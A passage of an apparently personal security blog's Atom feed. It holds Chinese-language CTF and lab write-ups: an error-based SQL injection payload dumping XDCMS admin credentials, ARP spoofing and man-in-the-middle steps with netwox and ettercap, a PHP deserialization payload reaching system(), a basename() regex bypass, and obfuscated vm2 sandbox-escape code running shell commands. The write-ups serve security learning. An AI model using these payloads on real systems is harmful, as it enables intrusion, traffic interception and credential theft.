<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xiaotan</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-23T03:15:55.378Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计练习（一）</title>
    <link href="http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-06-23T03:15:55.378Z</published>
    <updated>2020-06-23T03:15:55.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计练习（一）"><a href="#代码审计练习（一）" class="headerlink" title="代码审计练习（一）"></a>代码审计练习（一）</h1><h2 id="XDCMS"><a href="#XDCMS" class="headerlink" title="XDCMS"></a>XDCMS</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623103752008.png" alt="image-20200623103752008"></p><p>先打开index.php，有代码知先坚持config.inc.php是否存在不存在则跳转到安装页面。打开commmon.inc.php看一下。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104149304.png" alt="image-20200623104149304"></p><p>再打开xdcms.inc.php，有提示打开fun.inc.php，在该文件中，对接收参数使用safe_html()和save_replace()函数进行过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104541913.png" alt="image-20200623104541913"></p><p>可以看到这里进行了过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104616205.png" alt="image-20200623104616205"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104648257.png" alt="image-20200623104648257"></p><p>在global.inc.php文件中知对get进行了过滤没有进行POST的过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105333159.png" alt="image-20200623105333159"></p><p>fileds没有过滤</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105453088.png" alt="image-20200623105453088"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105635301.png" alt="image-20200623105635301"></p><p>在主页面进行会员注册。数据库报错,但是信息还是可以提交到数据库，会员注册成功，说明没有对提交的特殊字符进行过滤。由数据库报错信息可知，提交的信息是提交到表c_member中。</p><p>在源码中查找query</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623110247381.png" alt="image-20200623110247381"></p><p>考虑到使用数据库报错进行注入，利用代码如下：</p><p><code>update c_member set truename=&#39;simple&#39;,eamil=&#39;3456&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#where userid=9</code></p><p>在xdcms数据库执行利用代码。返回报错信息，在网页上执行利用代码：</p><p><code>56&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p><p>显示注册成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计练习（一）&quot;&gt;&lt;a href=&quot;#代码审计练习（一）&quot; class=&quot;headerlink&quot; title=&quot;代码审计练习（一）&quot;&gt;&lt;/a&gt;代码审计练习（一）&lt;/h1&gt;&lt;h2 id=&quot;XDCMS&quot;&gt;&lt;a href=&quot;#XDCMS&quot; class=&quot;header
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>实验环境 vmware12 + KALI2020.2</title>
    <link href="http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/"/>
    <id>http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/</id>
    <published>2020-05-30T07:43:56.350Z</published>
    <updated>2020-06-01T13:35:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境-vmware12-KALI2020-2"><a href="#实验环境-vmware12-KALI2020-2" class="headerlink" title="实验环境 vmware12 + KALI2020.2"></a>实验环境 vmware12 + KALI2020.2</h2><p>一：导入XP系统</p><p>1过程</p><ol><li><p>在 Workstation Pro 中，选择<strong>文件</strong> &gt; <strong>打开</strong>。</p></li><li><p>浏览到 .ovf 或 .ova 文件，然后单击<strong>打开</strong>。</p></li><li><p>键入虚拟机名称，再键入或浏览至虚拟机文件目录，然后单击<strong>导入</strong>。</p><p>Workstation Pro 会执行 OVF 规范一致性和虚拟硬件合规性检查。状态栏中会显示导入进度。</p></li><li><p>如果导入失败，可单击<strong>重试</strong>重新尝试操作，或者单击<strong>取消</strong>以取消导入。</p><p>如果重新尝试导入，Workstation Pro 会放宽 OVF 规范一致性与虚拟硬件合规性检查，但您可能无法使用 Workstation Pro 中的虚拟机。</p></li></ol><h2 id="二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）"><a href="#二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）" class="headerlink" title="二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）"></a>二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）</h2><p>同时关闭XP的防火墙。</p><p>对win10进行设置：</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234440730.png" alt="image-20200529234440730"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234451763.png" alt="image-20200529234451763"></p><h3 id="二（补充）：如果无法点击高级设置。就搜索防火墙"><a href="#二（补充）：如果无法点击高级设置。就搜索防火墙" class="headerlink" title="二（补充）：如果无法点击高级设置。就搜索防火墙"></a>二（补充）：如果无法点击高级设置。就搜索防火墙</h3><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530171703863.png" alt="image-20200530171703863"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234504869.png" alt="image-20200529234504869"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234516814.png" alt="image-20200529234516814"></p><h2 id="三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"><a href="#三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式" class="headerlink" title="三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"></a>三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153718746.png" alt="image-20200530153718746"></h2><p>【按住ctrl左键点击vm8和可以联网的网卡，右键vm8点击桥接。会出现新的网卡。右键新的网络，点击“属性“，找到“IPv4”，打开其”属性“，默认为自动获取IP，改成手动设置，IP填写你局域网中的IP，比如我的可以填写为192.168.31.109（只要符合你们局域网IP范围就可以），子网掩码默认，在默认网关处填写路由器的IP，比如我的是192.168.31.1；】<strong>该步骤是解决win10桥接下无法联网的解决办法，<u>可跳过</u></strong></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530174900133.png" alt="image-20200530174900133"></p><p>默认网关用ipconfig查看。</p><p>【在下方的DNS处，可以填写比较好用的114.114.114.114和223.5.5.5。然后确定。<br>】<em><em>这步骤同上。</em>，若虚拟机有网则不需要</em></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530175305661.png" alt="image-20200530175305661"></p><h2 id="四：修改虚拟机网络配置"><a href="#四：修改虚拟机网络配置" class="headerlink" title="四：修改虚拟机网络配置"></a>四：修改虚拟机网络配置</h2><p>1.打开虚拟网络编辑器</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210737893.png" alt="image-20200601210737893"></p><p>2.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180640690.png" alt="image-20200530180640690"></p><p>这里的网卡需要设置成本机名字的网卡。比如：AC 9462</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180917529.png" alt="image-20200530180917529"></p><p>3.选择桥接模式</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210915755.png" alt="image-20200601210915755"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154028167.png" alt="image-20200530154028167"></p><p>将XP和kali的设置都设置成桥接模式。如上图。</p><p><strong>要保证虚拟机之间虚拟机主机 主机虚拟机可以互ping，并且在同一网段</strong></p><p><strong>如果都能成功，则修改完成。</strong></p><h2 id="五：安装netwox"><a href="#五：安装netwox" class="headerlink" title="五：安装netwox"></a>五：安装netwox</h2><p>1.sudo vi /etc/apt/sources.list</p><p>2.在后面添加源：</p><pre><code class="text">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><p>3.i是插入。</p><blockquote><p>sudo apt-get update</p><p>sudo apt-get install netwox</p></blockquote><h2 id="五：运行Netwox工具包，对靶机进行假冒源地址"><a href="#五：运行Netwox工具包，对靶机进行假冒源地址" class="headerlink" title="五：运行Netwox工具包，对靶机进行假冒源地址"></a>五：运行Netwox工具包，对靶机进行假冒源地址</h2><p>本机：192.168.31.21</p><p>XP：192.168.31.128</p><p>kali：192.168.31.129</p><p>1—互相ping通，记录mac地址和IP。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132059565.png" alt="image-20200530132059565"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132111925.png" alt="image-20200530132111925"></p><p>2.</p><p>记下kali xp 物理机的 IP和MAC地址。如果显示上图则表示成功。在kali上输入：<strong>每个人输入的不一样，这个终端<u>别关掉</u>它不会出现回显的</strong></p><blockquote><p>sudo netwox 80 “00:0c:29:c8:27:5d”（kali的MAC地址） -i “192.168.31.21”    （win10）//告诉靶机B，靶机C192.168.31.21的MAC地址 00:0c:29:c8:27:5d</p></blockquote><p>3.</p><p>在kali中再打开一个终端sudo wireshark</p><p>切换到XP系统，输入arp -a</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530130418592.png" alt="image-20200530130418592"></p><p>可以看见kali正在欺骗XP（192.168.31.128）win10的mac地址为00:0c:29:c8:27:5d（而实际上这其实是kali的mac地址）</p><p><strong><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530131219459.png" alt="image-20200530131219459"></strong></p><p>可以发现已经欺骗成功了。这个时候XP上ping 192.168.31.21发现无法成功。</p><p><strong>这样就完成了一次简单的ARP欺骗。</strong></p><h2 id="六：ettercap-实现中间人攻击"><a href="#六：ettercap-实现中间人攻击" class="headerlink" title="六：ettercap 实现中间人攻击"></a>六：ettercap 实现中间人攻击</h2><p>1.</p><blockquote><p>sudo ettercap -G(新版ettercap,旧版在下面)</p></blockquote><p>2.首先选择Sniff-&gt;ARP poioning</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154601623.png" alt="image-20200530154601623"></p><p>3.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154637446.png" alt="image-20200530154637446"></p><p>从我们发现的主机中，选择我们的目标。从<code>Hosts</code>菜单栏中选择</p><p>3.<code>Hosts list</code>。</p><p>4.scan for hosts</p><ol><li>从列表中选择<code>192.168.31.21</code>，并点击<code>Add to Target 1</code>。</li><li>之后选择<code>192.168.31.128，之后点击</code>Add to Target 2`。</li><li>现在我们检查目标：在<code>Targets</code>菜单中，选择<code>Current targets</code>。</li></ol><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154508637.png" alt="image-20200530154508637"></p><p>5.然后点击左上角的箭头开始攻击。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601184923242.png" alt="image-20200601184923242"></p><p>可以发现mac地址已经全部修改为kali的mac地址。</p><p>6.查看wireshark，仔细观察可以看见kali一直在广播对XP和win10进行ARP欺骗。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p><h2 id="旧版"><a href="#旧版" class="headerlink" title="旧版"></a>旧版</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203006988.png" alt="image-20200530203006988"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203019644.png" alt="image-20200530203019644"></p><p>然后右上角start</p><h2 id="七：使用netwox进行中间人攻击"><a href="#七：使用netwox进行中间人攻击" class="headerlink" title="七：使用netwox进行中间人攻击"></a>七：使用netwox进行中间人攻击</h2><p>将kali的MAC地址伪装成XP，向WIN10发送ARP Reply</p><p>将kali的MAC地址伪装成win10，向XP发送ARP Reply</p><p>一：在kali上开两个窗口分别输入</p><blockquote><p>sudo netwox 80 (kali MAC地址)  -i  “XP’s IP”</p><p>sudo netwox 80 (kali MAC地址)  -i  “Win10’s IP”</p></blockquote><p>二：arp -a(XP)</p><p>查看并记录XP和WIN10的ARP表变化</p><p>三：查看、记录并分析kali、XP和WIN10上wireshark捕获的ARP报文</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p><p>可以看见kali不停的播放ARP广播实行欺骗。</p><ul><li><p>当XP发送数据给WIN10时，通过广播ARP 请求包，询问IP(win10)映射的MAC(win10)</p></li><li><p>同一网段的主机都会收到ARP请求包。win10会返回IP(WIN10)–MAC(WIN10)，攻击节点kali会返回IP(WIN10)–MAC(kali)，其他机器不做应答。</p></li><li><p>尽管win10也做出响应，但kali不断发送响应包，导致XP的ARP映射表保存了错误的映射。当xp想WIN10发送数据的时候，将会发送到kali的端口。若kali同时冒充XP和WIN10，则这就构成了中间人攻击。</p></li></ul><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p><p>而也可实现互相ping通，则可发现实验是成功的，kali成功的对win10和winXP之间的通信进行了欺骗。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境-vmware12-KALI2020-2&quot;&gt;&lt;a href=&quot;#实验环境-vmware12-KALI2020-2&quot; class=&quot;headerlink&quot; title=&quot;实验环境 vmware12 + KALI2020.2&quot;&gt;&lt;/a&gt;实验环境 vmware1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 朱雀组]phpweb</title>
    <link href="http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/"/>
    <id>http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/</id>
    <published>2020-05-20T10:18:49.067Z</published>
    <updated>2020-05-20T10:18:49.067Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>fuzz一下发现报错信息中有call_user_func()。但是我太菜了绕不过。用payload：</p><blockquote><p>func=file_get_contents&amp;p=index.php</p></blockquote><p>看一下源码</p><pre><code class="php">&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) {        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) {            return $result;        } else {return &quot;&quot;;}    }    class Test {        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() {            if ($this-&gt;func != &quot;&quot;) {                echo gettime($this-&gt;func, $this-&gt;p);            }        }    }    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) {        $func = strtolower($func);        if (!in_array($func,$disable_fun)) {            echo gettime($func, $p);        }else {            die(&quot;Hacker...&quot;);        }    }    ?&gt;</code></pre><p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p><pre><code>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</code></pre><p><code>&lt;?php</code><br><code>class Test {</code><br>    <code>var $p = &quot;Y-m-d h:i:s a&quot;;</code><br>    <code>var $func = &quot;date&quot;;</code><br>    <code>function __destruct() {</code><br>        <code>if ($this-&gt;func != &quot;&quot;) {</code><br>            <code>echo gettime($this-&gt;func, $this-&gt;p);</code><br>        <code>}</code><br>    <code>}</code><br><code>}</code></p><p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>$a = new Test();</code></p><p> <code>$a -&gt; p=&quot;cat /tmp/flagoefiu4r93&quot;;</code></p><p> <code>$a -&gt; func = &quot;system&quot;; print_r(urlencode(serialize($a)));</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[Zer0pts2020]Can you guess it</title>
    <link href="http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/"/>
    <id>http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/</id>
    <published>2020-05-19T04:34:31.612Z</published>
    <updated>2020-05-19T04:34:31.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>可以看到有一个随机数，如果能够破解随机数就能得到flag，在这里卡了半天也没做出来：</p><?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {  exit("I don't know what you are thinking, but I won't let you read it :)");}if (isset($_GET['source'])) {  highlight_file(basename($_SERVER['PHP_SELF']));  exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) {  $guess = (string) $_POST['guess'];  if (hash_equals($secret, $guess)) {    $message = 'Congratulations! The flag is: ' . FLAG;  } else {    $message = 'Wrong.';  }}?><!doctype html><html lang="en">  <head>    <meta charset="utf-8">    <title>Can you guess it?</title>  <meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml"></head>  <body>    <h1>Can you guess it?</h1>    <p>If your guess is correct, I'll give you the flag.</p>    <p><a href="?source">Source</a></p>    <hr><?php if (isset($message)) { ?>    <p><?= $message ?></p><?php } ?>    <form action="index.php" method="POST">      <input type="text" name="guess">      <input type="submit">    </form>  </body></html><p>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法<br>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</p><pre><code>/config\.php\/*$/i1</code></pre><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p><pre><code>/index.php/config.php/%0d</code></pre><p>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</p><p>但是正则过滤了/config.php/*$/i。<br>从 <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p><blockquote><p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p><p>所以这样就能绕过正则了，payload：</p></blockquote><blockquote><p>/index.php/config.php/%ff?source</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Zer0pts2020-Can-you-guess-it&quot;&gt;&lt;a href=&quot;#Zer0pts2020-Can-you-guess-it&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]Can you guess it?&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[HFCTF2020]JustEscape</title>
    <link href="http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/"/>
    <id>http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/</id>
    <published>2020-05-17T02:59:35.162Z</published>
    <updated>2020-05-17T02:59:35.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>最近老遇到js的题目，表示完全不会。</p><p>看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。</p><p>这是网上的payload：</p><pre><code class="javascript">&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function(){    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try{        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    }catch(e){        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    }}+&#39;)()&#39;;try{    console.log(new VM().run(untrusted));}catch(x){    console.log(x);}</code></pre><p>但是反引号和${}已经被过滤掉了，</p><pre><code class="javascript">(function (){    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`${`${`get_pro`}cess`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();    }})()</code></pre><p>第二种绕过是：使用join来拼接字符串</p><pre><code class="javascript">(()=&gt;{ TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try{ Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; }catch(e){ return e[`a`](()=&gt;{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); } })()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HFCTF2020-JustEscape&quot;&gt;&lt;a href=&quot;#HFCTF2020-JustEscape&quot; class=&quot;headerlink&quot; title=&quot;[HFCTF2020]JustEscape&quot;&gt;&lt;/a&gt;[HFCTF2020]JustEscape&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[XNUCA2019Qualifier]EasyPHP</title>
    <link href="http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/"/>
    <id>http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/</id>
    <published>2020-05-13T09:24:38.721Z</published>
    <updated>2020-05-13T09:24:38.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><ul><li>解法一<ul><li>[1、error_log结合log_errors自定义错误日志]</li><li>[2、include_path设置包含路径]</li><li>[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]</li><li>[4、# \ 绕过.htaccess中多余字符]</li></ul></li><li>解法二<ul><li>[5、.htaccess配置prce绕过正则匹配]</li></ul></li><li>[解法三]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XNUCA2019Qualifier-EasyPHP&quot;&gt;&lt;a href=&quot;#XNUCA2019Qualifier-EasyPHP&quot; class=&quot;headerlink&quot; title=&quot;[XNUCA2019Qualifier]EasyPHP&quot;&gt;&lt;/a&gt;[XNUCA2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <link href="http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/"/>
    <id>http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/</id>
    <published>2020-05-06T15:05:46.236Z</published>
    <updated>2020-05-07T01:40:24.396Z</updated>
    
